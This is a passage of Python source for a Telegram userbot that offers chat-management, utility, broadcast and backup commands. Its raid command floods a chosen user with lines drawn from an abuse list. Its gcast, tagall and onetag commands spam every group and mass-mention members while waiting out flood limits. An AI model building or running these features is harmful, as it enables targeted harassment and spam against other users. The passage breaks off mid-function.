            ip = getattr(a, "ip", "")
            country = getattr(a, "country", "")
            lines.append(f"<code>{idx}.</code> {curr} — <b>{dev}</b> ({plat}) | <code>{ip}</code> {country}")
        await reply_quote(m, "\n".join(lines), expandable=True)
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def privacy_cmd(c, m):
    dm_priv = "🟢 ᴏɴ" if get_dm_privacy_state(c.me.id) else "🔴 ᴏғғ"
    auto_seen = "🟢 ᴏɴ" if get_ubot_setting(c.me.id, "autoseen", False) else "🔴 ᴏғғ"
    auto_rep = "🟢 ᴏɴ" if get_ubot_setting(c.me.id, "autoreply_enabled", False) else "🔴 ᴏғғ"
    night_m = "🟢 ᴏɴ" if get_ubot_setting(c.me.id, "nightmode", False) else "🔴 ᴏғғ"
    vc_log = "🟢 ᴏɴ" if get_vc_logger_state(c.me.id, m.chat.id) else "🔴 ᴏғғ"
    prem_emoji = get_ubot_setting(c.me.id, "premium_emoji_id", 0)
    prem_status = f"🟢 ᴏɴ (<code>{prem_emoji}</code>)" if prem_emoji else "🔴 ᴏғғ"
    await reply_quote(
        m,
        f"🛡️ <b>『 ᴘʀɪᴠᴀᴄʏ &amp; sᴇᴄᴜʀɪᴛʏ sᴛᴀᴛᴜs 』</b> 🛡️\n\n"
        f"• <b>ᴅᴍ ᴘʀɪᴠᴀᴄʏ (3-ᴡᴀʀɴ):</b> {dm_priv}\n"
        f"• <b>ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪ:</b> {prem_status}\n"
        f"• <b>ᴀᴜᴛᴏ-sᴇᴇɴ:</b> {auto_seen}\n"
        f"• <b>ᴀᴜᴛᴏ-ʀᴇᴘʟʏ:</b> {auto_rep}\n"
        f"• <b>ɴɪɢʜᴛ ᴍᴏᴅᴇ:</b> {night_m}\n"
        f"• <b>ᴠᴄ ʟᴏɢɢᴇʀ (ᴛʜɪs ᴄʜᴀᴛ):</b> {vc_log}",
    )


# --- 3. CHAT MANAGEMENT COMMANDS ---
async def save_cmd(c, m):
    if not m.reply_to_message:
        return await reply_quote(m, "❌ <b>ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ sᴀᴠᴇ ɪɴ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs!</b>")
    try:
        await m.reply_to_message.copy("me")
        await reply_quote(m, "💾 <b>sᴀᴠᴇᴅ ᴛᴏ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs!</b>")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def del_cmd(c, m):
    if not m.reply_to_message:
        return await reply_quote(m, "❌ <b>ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ ᴅᴇʟᴇᴛᴇ!</b>")
    try:
        await m.reply_to_message.delete()
        await m.delete()
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def edit_cmd(c, m):
    if not m.reply_to_message or len(m.command) < 2:
        return await reply_quote(m, "❌ <b>ʀᴇᴘʟʏ ᴛᴏ ʏᴏᴜʀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ</b> <code>.edit &lt;new text&gt;</code><b>!</b>")
    new_text = m.text.split(None, 1)[1]
    try:
        await m.reply_to_message.edit_text(new_text)
        await m.delete()
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def pin_cmd(c, m):
    if not m.reply_to_message:
        return await reply_quote(m, "❌ <b>ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ ᴘɪɴ!</b>")
    loud = True
    if len(m.command) > 1 and m.command[1].lower() in ("silent", "quiet", "false"):
        loud = False
    try:
        await m.reply_to_message.pin(disable_notification=not loud)
        await reply_quote(m, "📌 <b>ᴍᴇssᴀɢᴇ ᴘɪɴɴᴇᴅ!</b>")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def unpin_cmd(c, m):
    try:
        if m.reply_to_message:
            await c.unpin_chat_message(m.chat.id, m.reply_to_message.id)
        else:
            await c.unpin_all_chat_messages(m.chat.id)
        await reply_quote(m, "📍 <b>ᴍᴇssᴀɢᴇ ᴜɴᴘɪɴɴᴇᴅ!</b>")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def purge_cmd(c, m):
    if not m.reply_to_message:
        return await reply_quote(m, "❌ <b>ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇ sᴛᴀʀᴛ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ</b> <code>.purge</code><b>!</b>")
    start_id = m.reply_to_message.id
    end_id = m.id
    msg_ids = list(range(start_id, end_id + 1))
    deleted = 0
    try:
        for i in range(0, len(msg_ids), 100):
            chunk = msg_ids[i : i + 100]
            await c.delete_messages(m.chat.id, chunk)
            deleted += len(chunk)
            await asyncio.sleep(0.2)
        confirm = await c.send_message(
            m.chat.id,
            qbox(f"🧹 <b>ᴘᴜʀɢᴇᴅ</b> <code>{deleted}</code> <b>ᴍᴇssᴀɢᴇs!</b>"),
            parse_mode=ParseMode.HTML,
        )
        await asyncio.sleep(2)
        await confirm.delete()
    except Exception as e:
        await reply_quote(m, f"❌ <b>ᴘᴜʀɢᴇ ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def history_cmd(c, m):
    limit = 10
    if len(m.command) > 1 and m.command[1].isdigit():
        limit = max(1, min(int(m.command[1]), 25))
    try:
        msgs = []
        async for msg in c.get_chat_history(m.chat.id, limit=limit + 1):
            if msg.id == m.id:
                continue
            sender = msg.from_user.first_name if msg.from_user else (msg.sender_chat.title if msg.sender_chat else "ᴜsᴇʀ")
            snippet = (msg.text or msg.caption or (f"[{msg.media.value}]" if msg.media else "")).replace("\n", " ")[:45]
            safe_snip = snippet.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            msgs.append(f"• <b>{sender}:</b> <code>{safe_snip}</code>")
            if len(msgs) >= limit:
                break
        text = f"🕘 <b>ᴄʜᴀᴛ ʜɪsᴛᴏʀʏ (ʟᴀsᴛ {len(msgs)})</b>\n\n" + ("\n".join(msgs) if msgs else "ɴᴏ ᴍᴇssᴀɢᴇs.")
        await reply_quote(m, text, expandable=True)
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


# --- 4. FUN & UTILITIES COMMANDS ---
async def font_cmd(c, m):
    parts = m.text.split(None, 2)
    style = "smallcaps"
    source_text = ""

    if m.reply_to_message and (m.reply_to_message.text or m.reply_to_message.caption):
        source_text = m.reply_to_message.text or m.reply_to_message.caption
        if len(parts) > 1 and parts[1].lower() in FONT_STYLES:
            style = parts[1].lower()
    else:
        if len(parts) < 2:
            styles_list = ", ".join(FONT_STYLES.keys())
            return await reply_quote(
                m,
                f"❌ <b>ᴜsᴀɢᴇ:</b> <code>.font &lt;style&gt; &lt;text&gt;</code> ʏᴀ ʀᴇᴘʟʏ\n🎨 <b>sᴛʏʟᴇs:</b> <code>{styles_list}</code>",
            )
        if parts[1].lower() in FONT_STYLES and len(parts) >= 3:
            style = parts[1].lower()
            source_text = parts[2]
        else:
            source_text = m.text.split(None, 1)[1]

    await reply_quote(m, stylize_text(source_text, style))


async def afk_cmd(c, m):
    uid = c.me.id
    reason = m.text.split(None, 1)[1].strip() if len(m.command) > 1 else "ʙᴜsʏ ʀɪɢʜᴛ ɴᴏᴡ"
    if reason.lower() in ("off", "back", "stop"):
        afk_state.pop(uid, None)
        return await reply_quote(m, "🟢 <b>ᴀғᴋ ᴍᴏᴅᴇ ᴏғғ! ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ.</b>")
    afk_state[uid] = {"reason": reason, "since": time.time()}
    await reply_quote(m, f"💤 <b>ᴀғᴋ ᴍᴏᴅᴇ ᴏɴ!</b>\n📝 <b>ʀᴇᴀsᴏɴ:</b> <code>{reason}</code>")


async def calc_cmd(c, m):
    expr = m.text.split(None, 1)[1] if len(m.command) > 1 else (m.reply_to_message.text or "")
    if not expr.strip():
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.calc 25 * 4 + 10</code>")
    try:
        result = safe_math_eval(expr)
        await reply_quote(
            m,
            f"🧮 <b>ᴄᴀʟᴄᴜʟᴀᴛᴏʀ</b>\n\n📥 <b>ɪɴᴘᴜᴛ:</b> <code>{expr.strip()}</code>\n📤 <b>ʀᴇsᴜʟᴛ:</b> <code>{result}</code>",
        )
    except Exception:
        await reply_quote(m, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴍᴀᴛʜ ᴇxᴘʀᴇssɪᴏɴ!</b>")


async def time_cmd(c, m):
    tz_input = m.text.split(None, 1)[1].strip() if len(m.command) > 1 else "Asia/Kolkata"
    try:
        now = datetime.now(ZoneInfo(tz_input))
        await reply_quote(
            m,
            f"🕒 <b>ᴛɪᴍᴇ ᴢᴏɴᴇ:</b> <code>{tz_input}</code>\n"
            f"📅 <b>ᴅᴀᴛᴇ:</b> <code>{now.strftime('%d %B %Y')}</code>\n"
            f"⏰ <b>ᴛɪᴍᴇ:</b> <code>{now.strftime('%I:%M:%S %p')}</code>",
        )
    except Exception:
        await reply_quote(m, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴛɪᴍᴇᴢᴏɴᴇ!</b> (ᴇ.ɢ. <code>.time Asia/Kolkata</code> ʏᴀ <code>.time UTC</code>)")


async def weather_cmd(c, m):
    city = m.text.split(None, 1)[1].strip() if len(m.command) > 1 else "Delhi"
    encoded_city = urllib.parse.quote(city)
    url = f"https://wttr.in/{encoded_city}?format=j1"

    def _fetch():
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            return json.loads(resp.read().decode("utf-8"))

    try:
        data = await asyncio.to_thread(_fetch)
        curr = data["current_condition"][0]
        temp_c = curr.get("temp_C", "N/A")
        feels_c = curr.get("FeelsLikeC", "N/A")
        humidity = curr.get("humidity", "N/A")
        desc = curr.get("weatherDesc", [{}])[0].get("value", "N/A")
        await reply_quote(
            m,
            f"🌤️ <b>ᴡᴇᴀᴛʜᴇʀ ɪɴ {city.upper()}</b>\n\n"
            f"🌡️ <b>ᴛᴇᴍᴘ:</b> <code>{temp_c}°C</code> (ғᴇᴇʟs <code>{feels_c}°C</code>)\n"
            f"☁️ <b>ᴄᴏɴᴅɪᴛɪᴏɴ:</b> <code>{desc}</code>\n"
            f"💧 <b>ʜᴜᴍɪᴅɪᴛʏ:</b> <code>{humidity}%</code>",
        )
    except Exception as e:
        await reply_quote(m, f"❌ <b>ᴡᴇᴀᴛʜᴇʀ ғᴇᴛᴄʜ ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def id_cmd(c, m):
    target = await resolve_target_user(c, m, allow_self_in_pm=False)
    lines = [f"🆔 <b>ᴄʜᴀᴛ ɪᴅ:</b> <code>{m.chat.id}</code>"]
    if m.chat.type != ChatType.PRIVATE:
        lines.append(f"💬 <b>ᴄʜᴀᴛ ᴛʏᴘᴇ:</b> <code>{m.chat.type.name}</code>")
    if target:
        lines.append(f"👤 <b>ᴛᴀʀɢᴇᴛ ᴜsᴇʀ ɪᴅ:</b> <code>{target.id}</code> ({target.first_name or 'ᴜsᴇʀ'})")
    elif m.from_user:
        lines.append(f"👤 <b>ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ:</b> <code>{m.from_user.id}</code>")
    if m.reply_to_message:
        lines.append(f"✉️ <b>ʀᴇᴘʟɪᴇᴅ ᴍsɢ ɪᴅ:</b> <code>{m.reply_to_message.id}</code>")
    await reply_quote(m, "\n".join(lines))


async def json_cmd(c, m):
    target_msg = m.reply_to_message or m
    raw_str = str(target_msg)
    if len(raw_str) > 3400:
        raw_str = raw_str[:3400] + "\n... [truncated]"
    safe_raw = raw_str.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    await reply_quote(m, f"🧾 <b>ᴍᴇssᴀɢᴇ ᴊsᴏɴ / ᴅᴀᴛᴀ</b>\n\n<pre>{safe_raw}</pre>", expandable=True)


# --- 5. ADVANCED FEATURES COMMANDS ---
async def autoreply_cmd(c, m):
    uid = c.me.id
    if len(m.command) < 2:
        curr_state = "ᴏɴ" if get_ubot_setting(uid, "autoreply_enabled", False) else "ᴏғғ"
        curr_msg = get_ubot_setting(
            uid,
            "autoreply_text",
            "ʜᴇʟʟᴏ! ᴍᴀɪɴ ᴀʙʜɪ ʀᴇᴘʟʏ ɴᴀʜɪ ᴋᴀʀ ᴘᴀᴜɴɢᴀ, ʙᴀᴀᴅ ᴍᴇ ʙᴀᴀᴛ ᴋᴀʀᴛᴇ ʜᴀɪɴ.",
        )
        return await reply_quote(
            m,
            f"🤖 <b>ᴀᴜᴛᴏ-ʀᴇᴘʟʏ:</b> <code>{curr_state}</code>\n"
            f"💬 <b>ᴍᴇssᴀɢᴇ:</b> <code>{curr_msg}</code>\n\n"
            f"ᴜsᴀɢᴇ: <code>.autoreply on/off</code> ʏᴀ <code>.autoreply &lt;custom text&gt;</code>",
        )
    arg = m.text.split(None, 1)[1].strip()
    if arg.lower() == "on":
        set_ubot_setting(uid, "autoreply_enabled", True)
        await reply_quote(m, "✅ <b>ᴀᴜᴛᴏ-ʀᴇᴘʟʏ ᴏɴ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ!</b>")
    elif arg.lower() == "off":
        set_ubot_setting(uid, "autoreply_enabled", False)
        await reply_quote(m, "🔴 <b>ᴀᴜᴛᴏ-ʀᴇᴘʟʏ ᴏғғ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ!</b>")
    else:
        set_ubot_setting(uid, "autoreply_text", arg)
        set_ubot_setting(uid, "autoreply_enabled", True)
        await reply_quote(m, f"✅ <b>ᴀᴜᴛᴏ-ʀᴇᴘʟʏ ᴏɴ &amp; ᴛᴇxᴛ sᴇᴛ:</b> <code>{arg}</code>")


async def autoseen_cmd(c, m):
    uid = c.me.id
    arg = m.command[1].lower() if len(m.command) > 1 else ("off" if get_ubot_setting(uid, "autoseen", False) else "on")
    enabled = arg in ("on", "true", "1", "yes")
    set_ubot_setting(uid, "autoseen", enabled)
    await reply_quote(m, f"👁️ <b>ᴀᴜᴛᴏ-sᴇᴇɴ {'ᴏɴ' if enabled else 'ᴏғғ'}!</b>")


async def nightmode_cmd(c, m):
    uid = c.me.id
    arg = m.command[1].lower() if len(m.command) > 1 else ("off" if get_ubot_setting(uid, "nightmode", False) else "on")
    enabled = arg in ("on", "true", "1", "yes")
    set_ubot_setting(uid, "nightmode", enabled)
    await reply_quote(m, f"🌙 <b>ɴɪɢʜᴛ ᴍᴏᴅᴇ {'ᴏɴ' if enabled else 'ᴏғғ'}!</b>")


async def gcast_cmd(c, m):
    text_to_send = m.text.split(None, 1)[1].strip() if len(m.command) > 1 else (m.reply_to_message.text or "").strip()
    if not text_to_send and not m.reply_to_message:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.gcast &lt;message&gt;</code> ʏᴀ ᴍᴇssᴀɢᴇ ᴘᴀʀ ʀᴇᴘʟʏ ᴋᴀʀᴇɪɴ.")

    status = await reply_quote(m, "📣 <b>ɢᴄᴀsᴛ sᴛᴀʀᴛᴇᴅ...</b>")
    sent, failed = 0, 0
    try:
        async for dialog in c.get_dialogs():
            if dialog.chat and dialog.chat.type in (ChatType.GROUP, ChatType.SUPERGROUP):
                try:
                    if m.reply_to_message and len(m.command) < 2:
                        await m.reply_to_message.copy(dialog.chat.id)
                    else:
                        await c.send_message(dialog.chat.id, qbox(text_to_send), parse_mode=ParseMode.HTML)
                    sent += 1
                    await asyncio.sleep(0.4)
                except errors.FloodWait as e:
                    await asyncio.sleep(e.value + 1)
                except Exception:
                    failed += 1
        if status:
            await status.edit_text(
                qbox(f"✅ <b>ɢᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n\n🟢 <b>sᴇɴᴛ:</b> <code>{sent}</code>\n🔴 <b>ғᴀɪʟᴇᴅ:</b> <code>{failed}</code>"),
                parse_mode=ParseMode.HTML,
            )
    except Exception as e:
        if status:
            await status.edit_text(qbox(f"❌ <b>ɢᴄᴀsᴛ ғᴀɪʟᴇᴅ:</b> <code>{e}</code>"), parse_mode=ParseMode.HTML)


async def backup_cmd(c, m):
    status = await reply_quote(m, "💼 <b>ʙᴀᴄᴋᴜᴘ ᴄʀᴇᴀᴛɪɴɢ...</b>")
    try:
        session_str = await c.export_session_string()
        me = await c.get_me()
        backup_payload = qbox(
            f"💼 <b>ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ʙᴀᴄᴋᴜᴘ</b>\n\n"
            f"👤 <b>ᴀᴄᴄᴏᴜɴᴛ:</b> {me.first_name or ''} (@{me.username or 'none'}) — <code>{me.id}</code>\n"
            f"🕒 <b>ᴛɪᴍᴇ:</b> <code>{get_current_ist_time()}</code>\n"
            f"🔑 <b>sᴇssɪᴏɴ sᴛʀɪɴɢ:</b>\n<code>{session_str}</code>"
        )
        await c.send_message("me", backup_payload, parse_mode=ParseMode.HTML)
        if status:
            await status.edit_text(qbox("✅ <b>ʙᴀᴄᴋᴜᴘ sᴀᴠᴇᴅ ᴛᴏ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs!</b>"), parse_mode=ParseMode.HTML)
    except Exception as e:
        if status:
            await status.edit_text(qbox(f"❌ <b>ʙᴀᴄᴋᴜᴘ ғᴀɪʟᴇᴅ:</b> <code>{e}</code>"), parse_mode=ParseMode.HTML)


async def restart_ubot_cmd(c, m):
    uid = c.me.id
    await reply_quote(m, "♻️ <b>ʀᴇsᴛᴀʀᴛɪɴɢ ᴜsᴇʀʙᴏᴛ...</b>")
    doc = load_local_sessions().get(str(uid))
    s_str = doc.get("session_str") if doc else None
    if not s_str:
        try:
            s_str = await c.export_session_string()
        except Exception:
            pass
    if not s_str:
        return
    try:
        new_ubot = Client(
            f"ubot_{uid}_{int(time.time() * 1000)}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=s_str,
            device_model=CLIENT_DEVICE_MODEL,
            system_version=CLIENT_SYSTEM_VERSION,
            app_version=CLIENT_APP_VERSION,
            in_memory=True,
        )
        register_ubot_handlers(new_ubot)
        await new_ubot.start()
        await warmup_client_peers(new_ubot)
        running_ubots[uid] = new_ubot
        try:
            await c.stop()
        except Exception:
            pass
    except Exception:
        pass


# --- EXISTING USERBOT COMMANDS (QUOTE STYLE) ---
async def ping_cmd(c, m):
    start_t = time.perf_counter()
    msg = await reply_quote(m, "🏓 <b>ᴘɪɴɢɪɴɢ...</b>")
    end_t = time.perf_counter()
    latency_ms = round((end_t - start_t) * 1000, 2)
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    text = (
        f"⚡ <b>ᴘᴏɴɢ!</b>\n\n"
        f"📶 <b>ᴘɪɴɢ:</b> <code>{latency_ms} ms</code>\n"
        f"⏳ <b>ᴜᴘᴛɪᴍᴇ:</b> <code>{uptime}</code>\n"
        f"👤 <b>ᴀᴄᴄᴏᴜɴᴛ:</b> {html_mention(c.me.id, c.me.first_name or 'ᴜsᴇʀ')}"
    )
    if msg:
        try:
            await msg.edit_text(qbox(text), parse_mode=ParseMode.HTML)
        except Exception:
            pass


async def info_cmd(c, m):
    target = await resolve_target_user(c, m, allow_self_in_pm=False) or c.me
    try:
        chat_info = await c.get_chat(target.id)
        bio = chat_info.bio or "ɴᴏɴᴇ"
    except Exception:
        bio = "ɴᴏɴᴇ"

    dc_id = getattr(target, "dc_id", None) or "ɴ/ᴀ"
    is_prem = "ʏᴇs" if getattr(target, "is_premium", False) else "ɴᴏ"
    uname = f"@{target.username}" if target.username else "ɴᴏɴᴇ"

    await reply_quote(
        m,
        f"🪪 <b>『 ᴀᴄᴄᴏᴜɴᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ 』</b> 🪪\n\n"
        f"👤 <b>ɴᴀᴍᴇ:</b> {target.first_name or 'ɴᴏɴᴇ'} {target.last_name or ''}\n"
        f"🆔 <b>ᴜsᴇʀ ɪᴅ:</b> <code>{target.id}</code>\n"
        f"🔗 <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {uname}\n"
        f"🌐 <b>ᴅᴄ ɪᴅ:</b> <code>{dc_id}</code>\n"
        f"⭐ <b>ᴘʀᴇᴍɪᴜᴍ:</b> <code>{is_prem}</code>\n"
        f"📝 <b>ʙɪᴏ:</b> <code>{bio}</code>",
    )


async def alive_cmd(c, m):
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    alive_html = qbox(
        f"✨ <b>『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』</b> ✨\n\n"
        f"⏳ <b>ᴜᴘᴛɪᴍᴇ:</b> <code>{uptime}</code>\n"
        f"👤 <b>ᴜsᴇʀ:</b> {html_mention(c.me.id, c.me.first_name or 'ᴜsᴇʀ')}\n"
        f"👑 <b>ᴏᴡɴᴇʀ:</b> {OWNER_USERNAME}"
    )
    try:
        await m.delete()
        await c.send_photo(m.chat.id, photo=ALIVE_IMG, caption=alive_html, parse_mode=ParseMode.HTML)
    except Exception:
        await reply_quote(m, alive_html.replace("<blockquote>", "").replace("</blockquote>", ""))


ASSISTANT_HELP_QUOTE = qbox(
    "⚙️ <b>『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ᴍᴇɴᴜ 』</b> ⚙️\n\n"
    "👤 <b>ᴀᴄᴄᴏᴜɴᴛ &amp; ᴘʀᴏғɪʟᴇ:</b>\n"
    "<code>.myinfo</code> · <code>.setname</code> · <code>.setbio</code> · <code>.setpic</code> · <code>.delpic</code> · <code>.username</code> · <code>.info</code> · <code>.clone</code> · <code>.restclone</code> · <code>.premiumon</code> · <code>.premiumoff</code>\n\n"
    "🛡️ <b>sᴇᴄᴜʀɪᴛʏ &amp; ᴘʀɪᴠᴀᴄʏ:</b>\n"
    "<code>.block</code> · <code>.unblock</code> · <code>.blocked</code> · <code>.clearblocked</code> · <code>.sessions</code> · <code>.privacy</code> · <code>.dmprivacyon</code> · <code>.dmprivacyoff</code> · <code>.dmapprove</code> · <code>.dmunapprove</code>\n\n"
    "💬 <b>ᴄʜᴀᴛ &amp; ᴠᴄ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ:</b>\n"
    "<code>.save</code> · <code>.del</code> · <code>.edit</code> · <code>.pin</code> · <code>.unpin</code> · <code>.purge</code> · <code>.history</code> · <code>.tagall</code> · <code>.onetag</code> · <code>.raid</code> · <code>.vcloggeron</code> · <code>.vcloggeroff</code> · <code>.stop</code>\n\n"
    "🎨 <b>ғᴜɴ &amp; ᴜᴛɪʟɪᴛɪᴇs:</b>\n"
    "<code>.font</code> · <code>.afk</code> · <code>.calc</code> · <code>.time</code> · <code>.weather</code> · <code>.id</code> · <code>.json</code> · <code>.ping</code> · <code>.alive</code> · <code>.help</code>\n\n"
    "🚀 <b>ᴀᴅᴠᴀɴᴄᴇᴅ:</b>\n"
    "<code>.autoreply</code> · <code>.autoseen</code> · <code>.nightmode</code> · <code>.gcast</code> · <code>.backup</code> · <code>.restart</code>",
    expandable=True,
)


async def assistant_help_cmd(c, m):
    try:
        await m.delete()
        await c.send_message(m.chat.id, ASSISTANT_HELP_QUOTE, parse_mode=ParseMode.HTML)
    except Exception:
        await reply_quote(m, ASSISTANT_HELP_QUOTE.replace("<blockquote>", "").replace("</blockquote>", ""), expandable=True)


async def vclogger_on_cmd(c, m):
    set_vc_logger_state(c.me.id, m.chat.id, True)
    await reply_quote(
        m,
        "🎙️ <b>ᴠᴄ ʟᴏɢɢᴇʀ ᴏɴ!</b>\n"
        "✨ ᴀʙ ɪs ɢʀᴏᴜᴘ ᴍᴇ ᴠᴄ ᴊᴏɪɴ, ʟᴇᴀᴠᴇ, ɪɴᴠɪᴛᴇ &amp; ᴇɴᴅ ᴀʟᴇʀᴛs ᴀᴀᴇɪɴɢᴇ.",
    )


async def vclogger_off_cmd(c, m):
    set_vc_logger_state(c.me.id, m.chat.id, False)
    await reply_quote(m, "🔇 <b>ᴠᴄ ʟᴏɢɢᴇʀ ᴏғғ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ!</b>")


async def dmprivacy_on_cmd(c, m):
    set_dm_privacy_state(c.me.id, True)
    pm_guard_data[c.me.id] = {}
    await reply_quote(m, "🛡️ <b>ᴅᴍ ᴘʀɪᴠᴀᴄʏ ᴏɴ!</b>\n⚠️ 3 ᴍᴇssᴀɢᴇs ᴋᴇ ʙᴀᴀᴅ ᴀᴜᴛᴏ-ʙʟᴏᴄᴋ ᴀᴄᴛɪᴠᴇ ʜᴀɪ.")


async def dmprivacy_off_cmd(c, m):
    set_dm_privacy_state(c.me.id, False)
    pm_guard_data[c.me.id] = {}
    await reply_quote(m, "🔓 <b>ᴅᴍ ᴘʀɪᴠᴀᴄʏ ᴏғғ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ!</b>")


async def dmapprove_cmd(c, m):
    target = await resolve_target_user(c, m, allow_self_in_pm=True)
    if not target:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.dmapprove @username</code> / <code>user_id</code> / <code>tag</code> / <code>reply</code> ʏᴀ ᴅᴍ ᴍᴇ.")

    set_dm_approved(c.me.id, target.id, True)
    pm_guard_data.setdefault(c.me.id, {}).pop(int(target.id), None)

    await reply_quote(
        m,
        f"✅ <b>ᴅᴍ ᴀᴘᴘʀᴏᴠᴇᴅ!</b>\n"
        f"✦ <b>ᴜsᴇʀ:</b> {html_mention(target.id, target.first_name or 'ᴜsᴇʀ')} (<code>{target.id}</code>)\n"
        f"🛡️ ᴀʙ ɪɴᴋᴀ ᴅᴍ ʙʟᴏᴄᴋ ɴᴀʜɪ ʜᴏɢᴀ.",
    )


async def dmunapprove_cmd(c, m):
    target = await resolve_target_user(c, m, allow_self_in_pm=True)
    if not target:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.dmunapprove @username</code> / <code>user_id</code> / <code>tag</code> / <code>reply</code> ʏᴀ ᴅᴍ ᴍᴇ.")

    set_dm_approved(c.me.id, target.id, False)
    pm_guard_data.setdefault(c.me.id, {}).pop(int(target.id), None)

    await reply_quote(
        m,
        f"🚫 <b>ᴅᴍ ᴜɴᴀᴘᴘʀᴏᴠᴇᴅ!</b>\n"
        f"✦ <b>ᴜsᴇʀ:</b> {html_mention(target.id, target.first_name or 'ᴜsᴇʀ')} (<code>{target.id}</code>)\n"
        f"⚠️ ᴅᴍ ᴘʀɪᴠᴀᴄʏ ʀᴜʟᴇs ᴀʙ ɪɴ ᴘᴀʀ ʟᴀɢᴜ ʜᴏɴɢᴇ.",
    )


async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sʙ?"
    try:
        await m.delete()
    except Exception:
        pass

    msg_counter = 0
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid):
                break
            if not member.user or member.user.is_bot or member.user.is_deleted:
                continue
            try:
                clean_line = re.sub(r"<[^>]+>", "", input_text).strip() or "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sʙ?"
                await send_blockquote_message(c, m.chat.id, clean_line, mention_user=member.user)
                msg_counter += 1
                await asyncio.sleep(4.5 if msg_counter % 3 == 0 else 2.2)
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                await asyncio.sleep(1.5)
    except Exception:
        pass
    finally:
        active_tasks[uid] = False


async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    try:
        await m.delete()
    except Exception:
        pass

    msg_counter = 0
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid):
                break
            if not member.user or member.user.is_bot or member.user.is_deleted:
                continue
            try:
                raw_template = random.choice(DAILY_CHATS)
                clean_line = re.sub(r"<[^>]+>", "", raw_template).replace("{mention}", "").strip() or "ʜɪɪ"
                await send_blockquote_message(c, m.chat.id, clean_line, mention_user=member.user)
                msg_counter += 1
                await asyncio.sleep(4.5 if msg_counter % 3 == 0 else 2.2)
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                await asyncio.sleep(1.5)
    except Exception:
        pass
    finally:
        active_tasks[uid] = False


async def raid_cmd(c, m):
    uid = c.me.id
    count, target_user = await resolve_raid_target_and_count(c, m)

    if (
        m.chat.type not in [ChatType.PRIVATE, ChatType.BOT]
        and not m.reply_to_message
        and not target_user
    ):
        return await reply_quote(m, "❌ <b>ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ɢɪᴠᴇ @ᴜsᴇʀɴᴀᴍᴇ / ᴜsᴇʀ_ɪᴅ!</b>")

    active_tasks[uid] = True
    try:
        await m.delete()
    except Exception:
        pass

    reply_to_id = m.reply_to_message.id if (m.reply_to_message and not target_user) else None
    msg_counter = 0

    for _ in range(count):
        if not active_tasks.get(uid):
            break
        line = random.choice(ABUSE_RAIDS)
        if target_user:
